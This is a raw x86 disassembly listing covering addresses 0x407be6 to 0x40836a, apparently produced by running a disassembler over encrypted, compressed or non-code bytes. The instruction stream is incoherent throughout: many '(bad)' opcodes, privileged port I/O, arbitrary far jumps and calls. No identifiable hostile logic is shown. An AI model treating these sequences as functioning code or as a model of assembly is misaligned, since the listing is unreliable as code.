  407be6:	jns    0x407c49
  407be8:	inc    ebp
  407be9:	inc    edx
  407bea:	stos   DWORD PTR es:[edi],eax
  407beb:	in     eax,dx
  407bec:	inc    esi
  407bed:	cmp    esp,eax
  407bef:	sub    ebp,esp
  407bf1:	int3   
  407bf2:	jp     0x407c30
  407bf4:	(bad)  
  407bf5:	or     eax,0xc0fcd093
  407bfa:	pop    ebx
  407bfb:	mov    eax,ds:0x8e70bcc
  407c00:	add    BYTE PTR [edx+0x7e744af4],ch
  407c06:	aas    
  407c07:	dec    ebx
  407c08:	in     eax,dx
  407c09:	jle    0x407c38
  407c0b:	ins    DWORD PTR es:[edi],dx
  407c0c:	rcr    BYTE PTR [eax-0x2529b2d3],0x4a
  407c13:	sbb    ch,BYTE PTR [ebx+0x5e2730aa]
  407c19:	jmp    0x451089ae
  407c1e:	push   ebp
  407c1f:	pop    ds
  407c20:	add    cl,bl
  407c22:	ins    DWORD PTR es:[edi],dx
  407c23:	inc    ebx
  407c24:	jmp    0x407bea
  407c26:	cmp    esp,edx
  407c28:	int3   
  407c29:	arpl   si,bx
  407c2b:	xor    BYTE PTR [ebx],dh
  407c2d:	sbb    BYTE PTR [edi+0x21c8d2f1],bh
  407c33:	icebp  
  407c34:	(bad)  
  407c36:	retf   
  407c37:	mov    ds:0x510f804d,al
  407c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c3d:	out    0xc0,eax
  407c3f:	dec    ebp
  407c40:	pop    ebx
  407c41:	jp     0x407c8c
  407c43:	xor    BYTE PTR [esi],al
  407c45:	hlt    
  407c46:	es mov ah,0xe
  407c49:	int    0x49
  407c4b:	scas   al,BYTE PTR es:[edi]
  407c4c:	xor    dl,BYTE PTR [edx]
  407c4e:	call   0x900e:0xdb1cdbf4
  407c55:	jmp    0xe4d:0x5d948364
  407c5c:	in     eax,dx
  407c5d:	push   ebx
  407c5e:	jge    0x407bed
  407c60:	inc    esp
  407c61:	retf   
  407c62:	dec    esi
  407c63:	dec    edx
  407c64:	scas   al,BYTE PTR es:[edi]
  407c65:	jmp    0x407c70
  407c67:	in     al,dx
  407c68:	mov    eax,ds:0x3e3a0b3
  407c6d:	pop    ebx
  407c6e:	pop    ecx
  407c6f:	bnd jb 0x407c47
  407c72:	dec    edx
  407c73:	sub    esi,DWORD PTR [esi+0x4fe28d]
  407c79:	jno    0x407c2b
  407c7b:	cli    
  407c7c:	inc    ebx
  407c7d:	(bad)  
  407c7f:	cld    
  407c80:	xlat   BYTE PTR ds:[ebx]
  407c81:	fs add al,0xe6
  407c84:	pop    edx
  407c85:	repnz ds sub al,0x6d
  407c89:	jb     0x407cef
  407c8b:	jecxz  0x407d0c
  407c8d:	int    0x74
  407c8f:	push   cs
  407c90:	adc    al,0xca
  407c92:	cmp    DWORD PTR [ebx+0x4cf8c019],0xb27d2aeb
  407c9c:	push   edi
  407c9d:	test   ebx,esi
  407c9f:	sub    DWORD PTR [edx],edx
  407ca1:	mov    dh,0x7b
  407ca3:	mov    edi,0x6428ab60
  407ca8:	xor    eax,0xe2310b2b
  407cad:	(bad)  
  407caf:	cmp    bl,dl
  407cb1:	pop    eax
  407cb2:	clc    
  407cb3:	jo     0x407d2c
  407cb5:	or     bl,BYTE PTR [esi+0x15]
  407cb8:	ss pop ebp
  407cba:	mov    bl,0x6a
  407cbc:	aaa    
  407cbd:	adc    eax,0x322ec2ac
  407cc2:	nop
  407cc3:	aas    
  407cc4:	and    BYTE PTR [edx-0x4e2f730a],dl
  407cca:	imul   ebx,DWORD PTR [edi+0x68],0x7ea248dd
  407cd1:	(bad)  
  407cd3:	xchg   edx,eax
  407cd4:	pop    esp
  407cd5:	test   DWORD PTR [edi+0x2f2f4a05],esp
  407cdb:	add    ah,dl
  407cdd:	outs   dx,BYTE PTR ds:[esi]
  407cde:	repnz xlat BYTE PTR ds:[ebx]
  407ce0:	mov    BYTE PTR [ebx],ah
  407ce2:	push   edx
  407ce3:	push   es
  407ce4:	stos   BYTE PTR es:[edi],al
  407ce5:	xchg   esi,eax
  407ce6:	(bad)  
  407ce8:	enter  0xba18,0xb1
  407cec:	dec    ecx
  407ced:	sar    eax,cl
  407cef:	fimul  WORD PTR [edx+0x4b]
  407cf2:	xor    BYTE PTR [edx],ch
  407cf4:	pop    esi
  407cf5:	push   ebp
  407cf6:	jecxz  0x407c7a
  407cf8:	xchg   edi,eax
  407cf9:	lahf   
  407cfa:	add    al,0xaf
  407cfc:	(bad)  
  407cfd:	mov    DWORD PTR [edi+ebp*1],esi
  407d00:	add    BYTE PTR [ecx],bh
  407d02:	inc    ecx
  407d03:	loop   0x407d43
  407d05:	push   ecx
  407d06:	bound  edi,QWORD PTR [esi+esi*8+0x5b]
  407d0a:	xor    BYTE PTR [edi-0x3a],cl
  407d0d:	js     0x407c92
  407d0f:	retf   0x77be
  407d12:	jmp    0x407d6a
  407d14:	jae    0x407d4a
  407d16:	inc    ecx
  407d17:	test   DWORD PTR [ebx-0x30],ecx
  407d1a:	add    ch,BYTE PTR [eax]
  407d1c:	ins    DWORD PTR es:[edi],dx
  407d1d:	and    al,BYTE PTR [edi]
  407d1f:	aad    0x74
  407d21:	pop    ss
  407d22:	mov    al,0xb6
  407d24:	fadd   st,st(1)
  407d26:	retf   
  407d27:	dec    esp
  407d28:	pop    ds
  407d29:	mov    ah,0xe1
  407d2b:	loop   0x407d4b
  407d2d:	jmp    0x407d12
  407d2f:	mov    ebp,0x2fee6bf7
  407d34:	push   ecx
  407d35:	test   BYTE PTR [ebp-0x25268ead],0x8b
  407d3c:	jle    0x407d67
  407d3e:	push   eax
  407d3f:	add    BYTE PTR [edi],dh
  407d41:	xor    BYTE PTR [ebx+esi*1+0x17be12eb],dh
  407d48:	stos   BYTE PTR es:[edi],al
  407d49:	outs   dx,DWORD PTR ds:[esi]
  407d4a:	cwde   
  407d4b:	sub    DWORD PTR [eax+edi*4-0x4a],0xd4b553d
  407d53:	sub    edx,edi
  407d55:	mov    dh,0x80
  407d57:	repnz sbb al,0x3a
  407d5a:	nop
  407d5b:	nop
  407d5c:	test   BYTE PTR [edi],0x9a
  407d5f:	rcl    ebp,0xb9
  407d62:	add    DWORD PTR [edx+0x1a],ecx
  407d65:	push   ebx
  407d66:	dec    esi
  407d67:	xchg   edi,eax
  407d68:	ret    0xfa5b
  407d6b:	mov    cl,0x48
  407d6d:	xlat   BYTE PTR ds:[ebx]
  407d6e:	jne    0x407d80
  407d70:	ret    
  407d71:	popa   
  407d72:	pop    edi
  407d73:	loopne 0x407d43
  407d75:	xor    ecx,DWORD PTR [ebp+0x2763ad53]
  407d7b:	adc    esi,DWORD PTR [eax+0x36]
  407d7e:	dec    edi
  407d7f:	lods   eax,DWORD PTR ds:[esi]
  407d80:	push   edx
  407d81:	sbb    al,0xfd
  407d83:	int3   
  407d84:	or     eax,0xd8fb5a62
  407d89:	imul   ebx,DWORD PTR [edi+0x2fd423ff],0xe2b4077b
  407d93:	ss push 0xc5812b1e
  407d99:	inc    ebp
  407d9a:	popf   
  407d9b:	stos   DWORD PTR es:[edi],eax
  407d9c:	inc    esp
  407d9d:	test   eax,0x4a297ca3
  407da2:	xor    BYTE PTR [ebx-0x4a10aba6],ch
  407da8:	loop   0x407d4c
  407daa:	clc    
  407dab:	rcl    edx,0xa4
  407dae:	fldenv [eiz*4-0x6fb7f1dc]
  407db5:	cmp    al,0xcb
  407db7:	icebp  
  407db8:	mov    BYTE PTR [ebp-0x5e],0x80
  407dbc:	dec    esi
  407dbd:	jno    0x407e36
  407dbf:	retf   
  407dc0:	mov    bl,0x34
  407dc2:	lods   al,BYTE PTR ds:[esi]
  407dc3:	push   edx
  407dc4:	push   es
  407dc5:	aad    0x6c
  407dc7:	xor    ah,bh
  407dc9:	and    BYTE PTR ds:0x2307138e,cl
  407dcf:	pushf  
  407dd0:	xchg   ecx,eax
  407dd1:	adc    ch,BYTE PTR [ecx-0x6722b1b5]
  407dd7:	std    
  407dd8:	lahf   
  407dd9:	in     al,0x30
  407ddb:	or     DWORD PTR [esi-0x37],0xffffffee
  407ddf:	push   edi
  407de0:	push   eax
  407de1:	int    0x38
  407de3:	dec    esp
  407de4:	sub    eax,DWORD PTR [ecx+0x29]
  407de7:	push   edi
  407de8:	mov    esi,0x3e5702c2
  407ded:	push   eax
  407dee:	mov    ecx,0xc6182e91
  407df3:	or     dh,BYTE PTR [ecx+0x10]
  407df6:	add    DWORD PTR ss:[eax],ebx
  407df9:	pop    edx
  407dfa:	popa   
  407dfb:	xchg   esi,eax
  407dfc:	call   0x4a31:0x2f70aeb4
  407e03:	scas   eax,DWORD PTR es:[edi]
  407e04:	sub    eax,0x9064d34a
  407e09:	or     DWORD PTR [ecx],eax
  407e0b:	(bad)  
  407e0c:	cdq    
  407e0d:	into   
  407e0e:	fwait
  407e0f:	cmc    
  407e10:	inc    edi
  407e11:	pop    eax
  407e12:	cdq    
  407e13:	loop   0x407e25
  407e15:	xor    bl,bl
  407e17:	xor    dl,BYTE PTR [edi+0x46583636]
  407e1d:	add    BYTE PTR [edi+0x99d6ef7],bh
  407e23:	(bad)
  407e26:	pop    ss
  407e27:	jnp    0x407e51
  407e29:	inc    esp
  407e2a:	stos   BYTE PTR es:[edi],al
  407e2b:	or     BYTE PTR [ebp+0x58],bh
  407e2e:	cs out dx,eax
  407e30:	push   esp
  407e31:	sub    eax,0x76ede98f
  407e36:	int3   
  407e37:	adc    DWORD PTR ds:0xc32fe642,eax
  407e3d:	imul   esi,DWORD PTR [eax+0x659cf2b8],0x3a384316
  407e47:	inc    ebx
  407e48:	loop   0x407ec7
  407e4a:	jge    0x407dea
  407e4c:	cmp    bp,WORD PTR [edi]
  407e4f:	or     eax,DWORD PTR [esi-0x14351a44]
  407e55:	icebp  
  407e56:	or     BYTE PTR [esi-0x417dd581],ch
  407e5c:	or     al,0x19
  407e5e:	push   ecx
  407e5f:	pusha  
  407e60:	pop    ss
  407e61:	xor    ch,BYTE PTR [ebx]
  407e63:	adc    al,0x71
  407e65:	xlat   BYTE PTR ds:[ebx]
  407e66:	out    0x75,eax
  407e68:	pop    esp
  407e69:	sbb    esp,DWORD PTR [eax]
  407e6b:	adc    BYTE PTR [ebx],bl
  407e6d:	push   ebp
  407e6e:	out    0x39,eax
  407e70:	retf   
  407e71:	test   eax,0x6f068d86
  407e76:	out    dx,al
  407e77:	aam    0xb7
  407e79:	test   BYTE PTR [ecx],dl
  407e7b:	ss mov al,0xdf
  407e7e:	push   0xffffffe8
  407e80:	inc    eax
  407e81:	inc    esp
  407e82:	fwait
  407e83:	adc    al,0x47
  407e85:	retf   0x3041
  407e88:	xchg   esp,eax
  407e89:	inc    ebx
  407e8a:	lods   eax,DWORD PTR ds:[esi]
  407e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e8d:	ja     0x407ee5
  407e8f:	inc    eax
  407e90:	popa   
  407e91:	les    edx,FWORD PTR [ebp+0x6971fd7c]
  407e97:	iret   
  407e98:	test   eax,0x1680fce6
  407e9d:	lea    edx,[edx+0x6b]
  407ea0:	sub    eax,0xce290b2
  407ea5:	inc    edx
  407ea6:	jo     0x407ecd
  407ea8:	mov    BYTE PTR [eax+0x32],bl
  407eab:	retf   0x81db
  407eae:	and    BYTE PTR [ebp+0x7e],al
  407eb1:	aaa    
  407eb2:	xchg   ebp,eax
  407eb3:	cmp    DWORD PTR [ecx],edi
  407eb5:	rol    DWORD PTR [edi],1
  407eb7:	push   esi
  407eb8:	xchg   DWORD PTR [ebp-0x24e521a],ebp
  407ebe:	stos   DWORD PTR es:[edi],eax
  407ebf:	imul   esp,DWORD PTR [esi-0x18],0xffffffdb
  407ec3:	push   0xd6ba2213
  407ec8:	jno    0x407ea4
  407eca:	sbb    DWORD PTR [edi+0x70],esp
  407ecd:	jnp    0x407eb5
  407ecf:	pop    ecx
  407ed0:	ret    0x7481
  407ed3:	ins    DWORD PTR es:[edi],dx
  407ed4:	or     cl,BYTE PTR [ecx-0x2f]
  407ed7:	jb     0x407f45
  407ed9:	arpl   WORD PTR [edi+eax*2],ax
  407edc:	mov    dh,0xa3
  407ede:	bound  edi,QWORD PTR [eax+0x6d]
  407ee1:	jne    0x407f62
  407ee3:	mul    BYTE PTR [edx-0x6b4027f8]
  407ee9:	push   esp
  407eea:	fs mov ecx,0x10253ab5
  407ef0:	fidiv  WORD PTR ds:0xc4fabbb7
  407ef6:	ret    
  407ef7:	(bad)  
  407ef8:	call   0xd04f:0xdf2b8fae
  407eff:	retf   0xc91b
  407f02:	or     eax,0x8acee966
  407f07:	sub    BYTE PTR [ebx],bh
  407f09:	fs jge 0x407ef0
  407f0c:	and    BYTE PTR [edx],0xc4
  407f0f:	ds dec eax
  407f11:	dec    ecx
  407f12:	pop    ecx
  407f13:	mov    edi,0xb47d7882
  407f18:	pop    esp
  407f19:	shl    esp,cl
  407f1b:	lahf   
  407f1c:	inc    edi
  407f1d:	mov    bh,0x2d
  407f1f:	or     DWORD PTR [ebx+0x12],ecx
  407f22:	loopne 0x407ee4
  407f24:	jbe    0x407f91
  407f26:	arpl   WORD PTR [bp+0x15],si
  407f2a:	aam    0x5b
  407f2c:	loop   0x407ebd
  407f2e:	dec    esp
  407f2f:	push   ebp
  407f30:	sbb    DWORD PTR [edi+0x22],esi
  407f33:	push   eax
  407f34:	popa   
  407f35:	xor    DWORD PTR [ecx],esi
  407f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f38:	cmp    BYTE PTR [ecx],dh
  407f3a:	fs cld 
  407f3c:	sbb    eax,0x8f2e2377
  407f41:	or     BYTE PTR es:[esi],bl
  407f44:	lods   al,BYTE PTR ds:[esi]
  407f45:	or     esp,DWORD PTR [edi]
  407f47:	pop    ecx
  407f48:	jne    0x407f00
  407f4a:	mov    ch,0x2c
  407f4c:	or     ebx,DWORD PTR [edi+0x70]
  407f4f:	pop    edi
  407f50:	sub    ah,BYTE PTR [eax]
  407f52:	mov    BYTE PTR [ecx+0x11f60be4],ah
  407f58:	stos   DWORD PTR es:[edi],eax
  407f59:	cmp    BYTE PTR [ebx-0x4df4aa67],ah
  407f5f:	out    0x4,al
  407f61:	fbld   TBYTE PTR [eax-0x75]
  407f64:	add    DWORD PTR [ecx-0x67],esp
  407f67:	mov    dh,0x51
  407f69:	pop    esi
  407f6a:	mov    dl,0x1f
  407f6c:	push   cs
  407f6d:	and    cl,dh
  407f6f:	cld    
  407f70:	sbb    eax,0xb3c69448
  407f75:	out    0xa6,eax
  407f77:	stos   DWORD PTR es:[edi],eax
  407f78:	mov    ch,0x7f
  407f7a:	fs mov dl,0xa8
  407f7d:	test   al,0xdd
  407f7f:	pushf  
  407f80:	adc    BYTE PTR [ecx+eiz*8],dl
  407f83:	ins    BYTE PTR es:[edi],dx
  407f84:	(bad)  
  407f85:	adc    eax,DWORD PTR [ecx]
  407f87:	rcl    BYTE PTR [eax+0x65d93083],1
  407f8d:	push   ebx
  407f8e:	cli    
  407f8f:	ficom  DWORD PTR [eax+0x59b7758c]
  407f96:	sbb    al,0x84
  407f98:	dec    esi
  407f99:	mov    eax,0x54abe4e6
  407f9e:	clc    
  407f9f:	iret   
  407fa0:	mov    ebx,esp
  407fa2:	out    0xed,eax
  407fa4:	loopne 0x407ff1
  407fa6:	rcl    dh,1
  407fa8:	arpl   WORD PTR [edi+0x127a6576],bp
  407fae:	fst    QWORD PTR [eax+edi*4+0x7a0e1d56]
  407fb5:	xchg   esp,eax
  407fb6:	pop    ds
  407fb7:	pop    ebx
  407fb8:	jecxz  0x407f79
  407fba:	mov    bl,0x98
  407fbc:	mov    eax,0x8645920b
  407fc1:	mov    ah,cl
  407fc3:	xlat   BYTE PTR ds:[ebx]
  407fc4:	in     eax,0xd
  407fc6:	cwde   
  407fc7:	sbb    ebp,esi
  407fc9:	mov    eax,ds:0x938f1a8
  407fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fcf:	imul   edi,DWORD PTR [ebx+0x2c282701],0x74
  407fd6:	dec    ecx
  407fd7:	packsswb mm0,QWORD PTR [edx-0x54cb9c05]
  407fde:	enter  0xefc7,0xe7
  407fe2:	test   BYTE PTR [ecx],dl
  407fe4:	fcom   st(4)
  407fe6:	dec    edi
  407fe7:	sbb    eax,0x4c3f6a3
  407fec:	xchg   BYTE PTR [edi],dl
  407fee:	inc    edi
  407fef:	(bad)  
  407ff0:	out    dx,eax
  407ff1:	retf   
  407ff2:	pop    edi
  407ff3:	inc    esp
  407ff4:	(bad)  
  407ff5:	or     BYTE PTR [edi-0x185c9ce9],dl
  407ffb:	inc    eax
  407ffc:	pop    edi
  407ffd:	lods   al,BYTE PTR ds:[esi]
  407ffe:	loop   0x407fb4
  408000:	mov    dh,0xb
  408002:	mov    BYTE PTR [ecx],ah
  408004:	xchg   BYTE PTR [edx-0x11dc033e],dh
  40800a:	fimul  DWORD PTR [ecx+0x26af64c]
  408010:	outs   dx,BYTE PTR ds:[esi]
  408011:	outs   dx,BYTE PTR ds:[esi]
  408012:	xor    ebx,DWORD PTR [edx-0x24]
  408015:	mov    cl,0x9a
  408017:	mov    ecx,0x4374a0a7
  40801c:	repz pop es
  40801e:	add    ebp,DWORD PTR [ebp-0x4b]
  408021:	cmp    al,0xe8
  408023:	xchg   ebp,eax
  408024:	xor    eax,0x7c06ff39
  408029:	sub    eax,0xeb3d84df
  40802e:	inc    esi
  40802f:	int    0xb5
  408031:	int3   
  408032:	inc    cx
  408034:	adc    DWORD PTR [edx-0x3de4684c],esp
  40803a:	ret    
  40803b:	and    DWORD PTR [ebp+0x41],0xffffffde
  40803f:	std    
  408040:	je     0x408011
  408042:	nop
  408043:	mov    dh,0xd7
  408045:	ret    
  408046:	jns    0x40800d
  408048:	(bad)  
  408049:	in     al,dx
  40804a:	xchg   esi,eax
  40804b:	adc    cl,BYTE PTR [ecx+0x4fc40176]
  408051:	jno    0x4080c2
  408053:	jae    0x408045
  408055:	adc    eax,0xdba29e93
  40805a:	(bad)  
  40805b:	pop    esp
  40805c:	das    
  40805d:	push   edi
  40805e:	(bad)  [eax+0x52]
  408061:	call   0xcf37:0x18777ad1
  408068:	xchg   ebx,eax
  408069:	jnp    0x4080a5
  40806b:	sub    edx,ebx
  40806d:	adc    al,BYTE PTR [bx+0x73]
  408071:	clc    
  408072:	mov    dl,0xd8
  408074:	adc    cl,dh
  408076:	dec    ebx
  408077:	out    0x33,eax
  408079:	into   
  40807a:	shl    dh,0x4c
  40807d:	rol    DWORD PTR [esi],1
  40807f:	jecxz  0x408086
  408081:	or     al,0xaf
  408083:	ja     0x4080f2
  408085:	cld    
  408086:	jno    0x40800e
  408088:	mov    WORD PTR [edi-0x47],ds
  40808b:	mov    eax,ds:0xebcea970
  408090:	enter  0x46e3,0x9e
  408094:	ror    BYTE PTR [eax],0x41
  408097:	add    DWORD PTR [esi+0x74],ebp
  40809a:	pop    ebp
  40809b:	jns    0x408025
  40809d:	jo     0x40803d
  40809f:	lods   eax,DWORD PTR ds:[esi]
  4080a0:	adc    DWORD PTR [ecx+ecx*1+0x39],esi
  4080a4:	arpl   WORD PTR [ecx-0x75],bx
  4080a7:	in     eax,dx
  4080a8:	jns    0x408076
  4080aa:	sbb    cl,0xe
  4080ad:	clc    
  4080ae:	and    al,0xc8
  4080b0:	xor    ecx,ebx
  4080b2:	sbb    al,0x19
  4080b4:	sbb    ebp,DWORD PTR [esi]
  4080b6:	aaa    
  4080b7:	inc    ebp
  4080b8:	in     al,0xc9
  4080ba:	shr    BYTE PTR [eax+0x7c4ab8d5],cl
  4080c0:	mov    al,0x9
  4080c2:	test   dh,0x99
  4080c5:	pop    esi
  4080c6:	pop    ds
  4080c7:	fsub   st(2),st
  4080c9:	pop    ebx
  4080ca:	mov    dh,0x96
  4080cc:	jb     0x4080d3
  4080ce:	lds    ebp,FWORD PTR [ecx+0x16]
  4080d1:	xchg   edx,eax
  4080d2:	mov    edi,0xb9b69a12
  4080d7:	mov    ch,0xb8
  4080d9:	push   ss
  4080da:	fnstcw WORD PTR [edi+0x18]
  4080dd:	gs jp  0x408097
  4080e0:	inc    eax
  4080e1:	(bad)  
  4080e2:	ss adc esp,ecx
  4080e5:	or     ebp,eax
  4080e7:	test   BYTE PTR [ecx+0x188e06da],bh
  4080ed:	int    0x98
  4080ef:	ja     0x4080cb
  4080f1:	in     al,dx
  4080f2:	pop    ebx
  4080f3:	cmp    edx,eax
  4080f5:	stos   BYTE PTR es:[edi],al
  4080f6:	sub    ah,dh
  4080f8:	(bad)  
  4080f9:	call   0xe442c673
  4080fe:	mov    al,0x99
  408100:	sub    al,0xd1
  408102:	mov    cl,0x52
  408104:	push   esp
  408105:	(bad)  
  408106:	sub    al,0x2c
  408108:	fidivr WORD PTR [ecx+0x6cea7a4d]
  40810e:	stos   DWORD PTR es:[edi],eax
  40810f:	outs   dx,DWORD PTR ds:[esi]
  408110:	fld    QWORD PTR [ebp+0x47f0ccfb]
  408116:	test   al,dl
  408118:	mov    al,ds:0x9e96e8bc
  40811d:	xchg   ebx,eax
  40811e:	cs test edi,esp
  408121:	inc    esi
  408122:	fisttp QWORD PTR [eax]
  408124:	stc    
  408125:	or     eax,0xd87a0598
  40812a:	bound  bx,DWORD PTR [eax]
  40812d:	cmp    ebx,DWORD PTR [edi+0x266fdaa]
  408133:	call   DWORD PTR [eax-0x5bae07de]
  408139:	xlat   BYTE PTR ds:[ebx]
  40813a:	pop    ss
  40813b:	mov    gs,WORD PTR [ebp-0x3c8b096e]
  408141:	jmp    0x8559:0x15caa6f7
  408148:	jmp    0xa1078134
  40814d:	nop
  40814e:	dec    esp
  40814f:	fwait
  408150:	not    BYTE PTR [ecx-0x5b2c922c]
  408156:	adc    BYTE PTR [esi+0x48a89368],bh
  40815c:	inc    esi
  40815d:	sbb    ah,BYTE PTR [edi]
  40815f:	ins    BYTE PTR es:[edi],dx
  408160:	fst    QWORD PTR [eax+esi*8-0x52]
  408164:	and    DWORD PTR [ebx-0x12cc9d10],0x3
  40816b:	xchg   esi,eax
  40816c:	fimul  DWORD PTR [esi+0x30]
  40816f:	fwait
  408170:	ret    
  408171:	stc    
  408172:	aam    0xf5
  408174:	mov    dl,0xc9
  408176:	mov    ebp,0xf1854b42
  40817b:	repz sub BYTE PTR [eax+ecx*1-0x1dec9f89],0xff
  408184:	push   0x54e19f00
  408189:	cmp    BYTE PTR [edx+0x4f],dh
  40818c:	ror    BYTE PTR [eax+0x30],0x61
  408190:	inc    edx
  408191:	or     DWORD PTR [esi],0x40
  408194:	fsub   st(2),st
  408196:	(bad)  
  408197:	aam    0xbd
  408199:	or     eax,0xa207bf7a
  40819e:	je     0x4081a3
  4081a0:	test   al,0x92
  4081a2:	xchg   BYTE PTR [edx],bl
  4081a4:	and    esi,DWORD PTR [ecx+esi*4-0x5b]
  4081a8:	lahf   
  4081a9:	cwde   
  4081aa:	mov    dl,0xca
  4081ac:	(bad)  
  4081ad:	js     0x408211
  4081af:	fnsave [edx]
  4081b1:	xlat   BYTE PTR ds:[ebx]
  4081b2:	push   eax
  4081b3:	xlat   BYTE PTR ds:[ebx]
  4081b4:	or     DWORD PTR [edx-0x37],esp
  4081b7:	jp     0x40816c
  4081b9:	xchg   ebp,eax
  4081ba:	push   ss
  4081bb:	cdq    
  4081bc:	neg    DWORD PTR [edx]
  4081be:	ret    
  4081bf:	in     eax,dx
  4081c0:	cmp    bh,BYTE PTR [eax+0x44]
  4081c3:	pop    es
  4081c4:	and    DWORD PTR [ebp+0x270a84f5],0x93e0e3ba
  4081ce:	adc    edx,DWORD PTR ds:0xe8b386f6
  4081d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081d5:	cs cld 
  4081d7:	mov    WORD PTR [eax+0x4cf81dc7],cs
  4081dd:	aaa    
  4081de:	ja     0x40823e
  4081e0:	jg     0x408209
  4081e2:	outs   dx,DWORD PTR ds:[esi]
  4081e3:	add    ah,BYTE PTR [ebx+0x50bdb322]
  4081e9:	pushf  
  4081ea:	ja     0x408208
  4081ec:	data16 jo 0x408221
  4081ef:	or     al,0xf3
  4081f1:	push   0x4f
  4081f3:	sub    al,BYTE PTR [ecx-0x19]
  4081f6:	and    al,0xf2
  4081f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f9:	mov    eax,0x6c6726bb
  4081fe:	and    al,0xf4
  408200:	fstp   QWORD PTR [eax+ebx*4]
  408203:	pop    ebx
  408204:	jne    0x408274
  408206:	rsqrtps xmm3,xmm4
  408209:	add    DWORD PTR [ebx],0x68
  40820c:	mov    edi,0x42b7942f
  408211:	cmc    
  408212:	cmp    al,0x53
  408214:	rcr    eax,1
  408216:	jp     0x4081a6
  408218:	xor    edx,DWORD PTR [edi+0x16480f03]
  40821e:	js     0x4081d6
  408220:	jo     0x408235
  408222:	pop    ss
  408223:	add    bl,BYTE PTR [ebp+0x12800889]
  408229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40822a:	shl    BYTE PTR [edi+ebp*4],0x65
  40822e:	xor    eax,0x8bc81619
  408233:	mov    cl,0x61
  408235:	les    esp,FWORD PTR [eax]
  408237:	loope  0x4081ee
  408239:	push   ss
  40823a:	jbe    0x4081e0
  40823c:	sub    dh,bh
  40823e:	frstor [bx+0xe]
  408242:	sub    BYTE PTR [edx+0xb83233c],0xc4
  408249:	cmp    ebp,DWORD PTR [edi]
  40824b:	push   esp
  40824c:	out    dx,eax
  40824d:	in     eax,0xe2
  40824f:	adc    eax,DWORD PTR [edi+0x0]
  408252:	imul   BYTE PTR [ecx+ecx*4-0x3759ea3c]
  408259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40825a:	sbb    eax,0x48cb2216
  40825f:	mov    ecx,0x66ba426d
  408264:	jmp    0xdd47:0x9e78efee
  40826b:	bound  esp,QWORD PTR [ebx+edx*8]
  40826e:	(bad)  
  40826f:	jne    0x4082d6
  408271:	sti    
  408272:	imul   ebx,DWORD PTR [ebp+0x73154bde],0xffffffd8
  408279:	cmp    esp,esp
  40827b:	clc    
  40827c:	cld    
  40827d:	out    0xb5,al
  40827f:	mov    dl,ch
  408281:	adc    eax,0x688e0924
  408286:	std    
  408287:	inc    edi
  408288:	test   al,0xb4
  40828a:	ins    BYTE PTR es:[edi],dx
  40828b:	aas    
  40828c:	push   esp
  40828d:	vpmulhw xmm1,xmm5,XMMWORD PTR [edi+esi*8-0x1a]
  408293:	inc    DWORD PTR [esi]
  408295:	jne    0x4082f3
  408297:	mov    cl,0xc6
  408299:	xor    al,0x6f
  40829b:	push   0x8
  40829d:	inc    ebp
  40829e:	mov    ss,WORD PTR [ebp-0xc0f840d]
  4082a4:	fsubrp st(4),st
  4082a6:	lds    eax,FWORD PTR [ebx]
  4082a8:	cdq    
  4082a9:	int3   
  4082aa:	ficom  WORD PTR [eax-0x2dd615d5]
  4082b0:	mov    bh,0x84
  4082b2:	jl     0x408271
  4082b4:	mov    eax,0x1c5cec60
  4082b9:	xchg   esp,eax
  4082ba:	cs pop esp
  4082bc:	jbe    0x408321
  4082be:	dec    ebp
  4082bf:	in     eax,dx
  4082c0:	or     al,0xb5
  4082c2:	enter  0x5324,0x3b
  4082c6:	pushf  
  4082c7:	cmp    eax,0x4fd12466
  4082cc:	dec    ecx
  4082cd:	dec    ecx
  4082ce:	push   cs
  4082cf:	leave  
  4082d0:	jne    0x408265
  4082d2:	mov    edi,0x1ef739a3
  4082d7:	in     eax,0x96
  4082d9:	daa    
  4082da:	mov    eax,0x900e9fa2
  4082df:	sub    BYTE PTR [ebx-0x38],bl
  4082e2:	enter  0xc013,0xd9
  4082e6:	adc    al,0xf7
  4082e8:	or     dl,BYTE PTR [esi+0x6f89f6f2]
  4082ee:	xor    esi,esp
  4082f0:	stos   DWORD PTR es:[edi],eax
  4082f1:	inc    edi
  4082f2:	mov    ebp,esi
  4082f4:	push   ecx
  4082f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082f6:	add    eax,0xcac0016e
  4082fb:	pop    eax
  4082fc:	cmp    al,0xf
  4082fe:	mov    esp,0x8328a6ff
  408303:	aaa    
  408304:	dec    esp
  408305:	icebp  
  408306:	lock jp 0x408298
  408309:	scas   eax,DWORD PTR es:[edi]
  40830a:	mov    al,ds:0x38ef6d3f
  40830f:	jmp    0x2f9852ae
  408314:	mov    edi,0x3c696eab
  408319:	or     DWORD PTR [ebp+0x21],0x84e67ee2
  408320:	mov    dl,0x4b
  408322:	es pop es
  408324:	test   al,0x1c
  408326:	fadd   QWORD PTR [ebx]
  408328:	repz cwde 
  40832a:	ret    0xcb3f
  40832d:	mov    ecx,0x14db03c7
  408332:	lock pop esp
  408334:	mov    BYTE PTR [edx-0x15],dl
  408337:	(bad)  
  408338:	jb     0x40833f
  40833a:	cmp    ebx,DWORD PTR [ecx+0x2]
  40833d:	aaa    
  40833e:	bound  esp,QWORD PTR [ecx+0x46ace963]
  408344:	push   0x5d
  408346:	sbb    BYTE PTR [edi+0x34],ah
  408349:	clc    
  40834a:	push   eax
  40834b:	push   ebp
  40834c:	dec    ecx
  40834d:	out    0x86,eax
  40834f:	add    ebp,ebp
  408351:	addr16 or al,0x14
  408354:	mov    cl,0x8b
  408356:	lahf   
  408357:	ficom  WORD PTR [ecx+0x732dc0fd]
  40835d:	ror    BYTE PTR [esi+0x2d],1
  408360:	inc    esp
  408361:	ss pop ebp
  408363:	dec    edx
  408364:	push   cs
  408365:	popa   
  408366:	inc    edx
  408367:	arpl   WORD PTR [ebp+0x6d],ax
  40836a:	sub    bh,BYTE PTR [ecx+ebp*4-0x50812c71]
